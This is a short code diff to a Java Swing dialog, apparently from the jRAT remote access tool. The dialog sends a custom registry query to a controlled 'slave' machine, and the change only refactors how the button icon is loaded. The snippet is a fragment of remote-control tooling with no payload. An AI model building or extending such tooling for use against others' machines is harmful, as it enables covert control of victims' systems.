@@ -7,7 +7,6 @@ import java.awt.event.ActionListener;
 import javax.swing.DefaultComboBoxModel;
 import javax.swing.GroupLayout;
 import javax.swing.GroupLayout.Alignment;
-import javax.swing.ImageIcon;
 import javax.swing.JButton;
 import javax.swing.JComboBox;
 import javax.swing.JFrame;
@@ -17,6 +16,7 @@ import javax.swing.border.EmptyBorder;
 
 import se.jrat.client.Slave;
 import se.jrat.client.packets.outgoing.Packet80CustomRegQuery;
+import se.jrat.client.utils.IconUtils;
 
 
 @SuppressWarnings({ "serial", "rawtypes", "unchecked" })
@@ -49,7 +49,7 @@ public class DialogCustomRegQuery extends BaseDialog {
 				slave.addToSendQueue(new Packet80CustomRegQuery(comboBox.getSelectedItem().toString().trim()));
 			}
 		});
-		btnExecuteRegexeCommand.setIcon(new ImageIcon(DialogCustomRegQuery.class.getResource("/icons/key_arrow.png")));
+		btnExecuteRegexeCommand.setIcon(IconUtils.getIcon("key_arrow.png"));
 		GroupLayout gl_contentPane = new GroupLayout(contentPane);
 		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addContainerGap().addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addComponent(comboBox, 0, 349, Short.MAX_VALUE).addComponent(btnExecuteRegexeCommand, Alignment.TRAILING)).addContainerGap()));
 		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addContainerGap().addComponent(comboBox, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED, 16, Short.MAX_VALUE).addComponent(btnExecuteRegexeCommand).addContainerGap()));
